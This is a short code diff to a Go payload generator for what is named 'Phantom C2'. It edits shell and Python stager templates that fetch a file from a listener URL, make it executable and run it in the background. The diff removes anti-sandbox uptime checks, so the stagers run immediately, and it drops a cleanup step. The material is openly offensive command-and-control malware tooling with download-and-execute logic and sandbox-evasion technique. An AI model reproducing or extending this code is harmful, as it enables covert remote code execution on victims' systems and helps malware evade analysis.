@@ -243,21 +243,16 @@ check_update() {
         chmod +x "$tmp"
         nohup "$tmp" >/dev/null 2>&1 &
     fi
-    rm -f "$tmp" 2>/dev/null
 }
 
-# Anti-sandbox: check uptime
-uptime_sec=$(cat /proc/uptime 2>/dev/null | cut -d. -f1)
-if [ "${uptime_sec:-0}" -gt 300 ]; then
-    check_update
-fi`
+check_update`
 	return renderTemplate(tmpl, cfg)
 }
 
 func generatePython(cfg PayloadConfig) (string, error) {
 	tmpl := `#!/usr/bin/env python3
 # Phantom C2 — Python Stager
-import urllib.request, subprocess, tempfile, os, platform, time
+import urllib.request, subprocess, tempfile, os, platform
 
 def check_update():
     url = '{{.ListenerURL}}/api/v1/update'
@@ -279,8 +274,7 @@ def check_update():
     except Exception:
         pass
 
-if time.monotonic() > 300:  # Anti-sandbox: 5min uptime
-    check_update()`
+check_update()`
 	return renderTemplate(tmpl, cfg)
 }
 
